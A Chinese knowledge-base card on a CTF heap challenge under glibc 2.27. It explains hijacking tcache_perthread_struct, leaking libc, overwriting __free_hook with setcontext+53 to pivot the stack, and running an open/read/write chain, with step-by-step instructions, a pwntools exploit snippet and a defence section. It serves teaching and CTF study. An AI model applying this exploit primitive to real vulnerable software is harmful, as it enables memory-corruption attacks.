---
id: binary-pwn-heap-latest-chunk-only-tcache-perthread-setcontext-orw
title: 只能操作最新 chunk 的堆题：劫持 tcache_perthread_struct 批量布置 fake chunk，free_hook→setcontext+53（0x35，mov rsp,[rdi+0xa0]）迁栈执行 ORW
type: scenario
domain: binary
path: binary/pwn/heap
technique: latest-chunk-only-tcache-perthread-hijack-setcontext-orw
tags:
- pwn
- heap
- tcache
- tcache-perthread-struct
- setcontext
- free-hook
- stack-pivot
- orw
- seccomp
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-V351
  verified_at: '2026-11-09T00:41:46+08:00'
  notes: 已对照原文 silverwolf 段与图34-42核对：只能操作最新 chunk、tcache_perthread_struct 劫持、unsorted 泄 libc、按 size class 批量布置 fake 块、free_hook→setcontext+53（0x35 的 mov rsp,[rdi+0xa0]，图34 红框）与图40/41/42 地址一致。原卡标题/别名/结论/步骤4误写 setcontext+0xa0，已修正为 setcontext+53（0x35）；libc 2.27/2.29/2.31 版本边界与原文一致。CTF 题无 affected_versions，已 clear；PoC 未执行。
url: /docs/binary/pwn/heap/binary-pwn-heap-latest-chunk-only-tcache-perthread-setcontext-orw/
draft: false
kb_aliases:
- 只能操作最新chunk
- tcache_perthread_struct 劫持
- free_hook setcontext
- setcontext+53（mov rsp,[rdi+0xa0]）迁栈
- 批量布置 fake chunk
- 堆题 ORW
- silverwolf
---

## 一句话结论

当 add/edit/show/delete 都只能操作“最近申请的那一个 chunk”（没有 index）时，可以先 tcache poisoning 让一次 malloc 返回 `tcache_perthread_struct`，改写其 counts/entries 让后续 malloc 按大小类返回任意地址，从而在多个 size class 上批量布置 fake ucontext 与 ORW 链；再用 unsorted bin 泄露 libc，把 `__free_hook` 改成 `setcontext+53`（0x35，即 libc 2.27 中 `mov rsp,[rdi+0xa0]` 指令所在偏移），free 伪造上下文触发迁栈，最终执行 open/read/write 读 flag。

## 原理

- **“只能操作最新 chunk”的限制**：程序用一个全局 `buf` 指针和 `size` 记录最近一次 malloc 的块，edit/show/delete 都只作用于它；无法按索引访问旧块。要连续布置多个不同大小的块，需要找到一个“能一次性影响后续多次 malloc”的结构——`tcache_perthread_struct`。
- **tcache_perthread_struct**：libc 2.26+ 的每个线程 tcache 管理结构，布局为 `char counts[64]; tcache_entry *entries[64];`（64 个大小类的计数 + 链表头指针数组），数据区约 0x250 字节。`malloc` 从 `entries[idx]` 取块并把 `entries[idx]` 更新为块内 next；因此只要改写 entries，就能让对应大小的 malloc 返回任意地址。
- **劫持结构体**：先 `add(0x78); delete(); show()`，被 free 块的 fd 泄露堆地址（libc 2.27 无 safe-linking，直接是下一个块指针）；`heap_base = leak - 0x11b0`。`edit(p64(heap_base + 0x10))` 把 tcache fd 毒化到结构体数据区，连续两次 `add(0x78)`，第二次 malloc 返回结构体，edit 即可改写 counts/entries。
- **泄露 libc**：把 `tcache_perthread_struct` 本身 free 进 unsorted bin，show 其 fd 得到 `main_arena+96`；`main_arena = leak - 96`，`__malloc_hook = main_arena - 0x10`，`libc_base = __malloc_hook - libc.sym['__malloc_hook']`。原文给出两种做法：反复 delete + `edit(p64(0)*2)` 恢复 counts 后填满 tcache 再 free；或伪造 counts 让 0x250 的 bin 看起来已满，下一次 free 直接进 unsorted bin。
- **批量布置**：counts 数组 0x40 字节清零，entries 按大小类依次写入目标地址：0x20→`__free_hook`、0x30→0、0x40→flag 字符串地址、0x50→fake_orw1、0x60→fake_orw2、0x70→orw1、0x80→orw2。随后 `add(0x18/0x38/0x68/0x78/0x58/0x48)` 依次拿到这些地址，edit 写入对应内容。
- **setcontext+ORW**：libc 2.27 的 `setcontext` 从 `rdi` 指向的 fake ucontext 恢复寄存器，关键指令 `mov rsp, [rdi+0xa0]` 把栈迁到 `[fake+0xa0]`，随后 `push [rdi+0xa8]; ...; ret`。把 `__free_hook` 写成 `setcontext+53`（即 `mov rsp,[rdi+0xa0]` 所在偏移），再 `delete()` 释放 fake_orw1：`free(fake_orw1)` 以 rdi=fake_orw1 进入 hook，setcontext 把 rsp 设为 orw1、返回地址设为 ret，ORW 链开始执行。
- **链分段**：由于 tcache 块大小只有 0x60/0x80，ORW 链被拆成两段分别放在 orw1（0x70 块）与 orw2（0x80 块）；fake_orw2 里存 `[orw1, ret]` 作为 ucontext 的 `+0xa0/+0xa8` 字段，fake_orw1 本身是 0x50 块。
- **版本边界**：该链依赖 libc 2.27 的 setcontext 使用 rdi；2.29 起 setcontext 改用 rdx 控制，需要额外 gadget 转 rdi→rdx；2.31 用 setcontext+0x61；2.34+ `__free_hook` 被移除，需要 FSOP/exit_funcs 等替代。

## 触发条件

- 目标为 glibc 2.26–2.28（本例 2.27），保留可写 `__free_hook`，且 `tcache_perthread_struct` 可通过 tcache poisoning 被分配到。
- 堆菜单只提供“最新 chunk”的 add/edit/show/delete，存在 UAF 或 double free 使得能读已释放块的 fd、并改写它。
- 能泄露 heap 地址（freed chunk 的 fd）与 libc 地址（unsorted bin 的 main_arena 指针）。
- 有可用的 libc gadget（pop rdi/rsi/rax、syscall）与 `setcontext` 偏移；目标开启 seccomp 只允许 ORW。
- 允许在堆上分配并写入 fake ucontext 结构。

## 利用步骤

1. `add(0x78); delete(); show()` 读被 free 块的 fd，计算 `heap_base`；`edit(p64(heap_base+0x10))` 毒化 tcache，连续两次 `add(0x78)` 让第二次返回 `tcache_perthread_struct`。
2. 通过反复 delete + `edit(p64(0)*2)` 填充 tcache（或伪造 counts 使 bin 视为已满），再 delete 把结构体 free 进 unsorted bin；`show()` 读 `main_arena` 指针算 libc 基址。
3. `edit(b'\x00'*0x78)` 清空 counts/entries，随后按大小类写入 `__free_hook`、flag 地址、fake_orw1、fake_orw2、orw1、orw2。
4. `add(0x18); edit(p64(setcontext+53))` 把 `__free_hook` 改为 setcontext 中 `mov rsp,[rdi+0xa0]` 指令（`setcontext+0x35`）的地址。
5. `add(0x38); edit(b'/flag\x00')` 写入文件名字符串。
6. `add(0x68); edit(orw_part1)`、`add(0x78); edit(orw_part2)` 分两段写 ORW 链（open/read/write）。
7. `add(0x58); edit(p64(orw1)+p64(ret))` 布置 fake_orw2 的 `+0xa0/+0xa8` 字段；`add(0x48); delete()` 释放 fake_orw1 触发 setcontext，rsp 迁到 orw1 执行 ORW，读取并输出 flag。

## PoC

关键片段（按原文 EXP 简化，偏移需按目标 libc 重标定）：

```python
# 1) 泄露 heap_base 并劫持 tcache_perthread_struct
add(0x78); delete(); show()
heap_leak = u64(p.recv(6).ljust(8, b'\x00'))
heap_base = heap_leak - 0x11b0
edit(p64(heap_base + 0x10))
add(0x78); add(0x78)          # 第二次 malloc 返回结构体

# 2) 泄露 libc：把结构体 free 进 unsorted bin
for i in range(7):
    delete(); edit(p64(0) * 2)
delete(); show()
main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 96
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']

# 3) 布置 entries：0x20 free_hook、0x40 flag、0x50 fake1、0x60 fake2、0x70 orw1、0x80 orw2
free_hook = libc_base + libc.sym['__free_hook']
flag_addr = heap_base + 0x1000
orw1, orw2 = heap_base + 0x3000, heap_base + 0x3060
fake1, fake2 = heap_base + 0x2000, heap_base + 0x20a0
payload  = b'\x00' * 0x40
payload += p64(free_hook) + p64(0)
payload += p64(flag_addr) + p64(fake1)
payload += p64(fake2) + p64(orw1) + p64(orw2)
edit(payload)

# 4) 写 free_hook = setcontext+0x35(mov rsp,[rdi+0xa0]) 并布置 fake 块
mov_rsp_rdi_a0 = libc_base + libc.sym['setcontext'] + 0x35
add(0x18); edit(p64(mov_rsp_rdi_a0))
add(0x38); edit(b'/flag\x00')
add(0x68); edit(shellcode[:0x60])
add(0x78); edit(shellcode[0x60:])
add(0x58); edit(p64(orw1) + p64(libc_base + 0x8aa))
add(0x48); delete()           # free(fake1) → setcontext → ORW
```

## 变体与关联

- **泄露方式**：除填满 tcache 外，可伪造 `counts` 让目标 bin 假满，一次 free 即进 unsorted bin；也可用 largebin/unsorted 其他路径泄 libc。
- **迁栈方式**：setcontext 之外可用 `__free_hook`→one_gadget、`_IO_list_all`/FSOP、`exit_funcs` 等；libc 2.29+ 需处理 setcontext 从 rdx 取上下文的变化。
- **布局方式**：tcache_perthread_struct 除用于“批量分配”，也可直接改 entries 打 GOT/栈（见 [[binary-pwn-heap-glibc243-tcache-perthread-struct-hijack]]）；本卡是“只能操作最新 chunk”约束下的组合应用。
- **关联卡片**：[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（free_hook→setcontext+61 的 bridge gadget）、[[binary-pwn-heap-glibc235-environ-front-chunk-overread-stack-orw]]（environ 泄栈 + tcache 毒化栈帧 ORW）。

## 检测与防御

- **版本缓解**：升级到 glibc 2.34+（移除 `__free_hook`/`__malloc_hook`）、启用 safe-linking 与 tcache double-free key，使 fd 毒化需要堆地址且禁止重复 free。
- **分配器加固**：tcache 目标地址对齐检查、`glibc.malloc.tcache_count` 限制、开启 MALLOC_CHECK_/hardened allocator。
- **程序层**：菜单操作按索引并校验指针是否已释放；free 后清零全局指针；限制 size 上限并避免 UAF。
- **CTF 之外**：该手法是堆利用的通用原语，检测关注异常 tcache fd、对 libc 全局指针（environ/hook/exit_funcs）的写与从堆发起的 ROP。
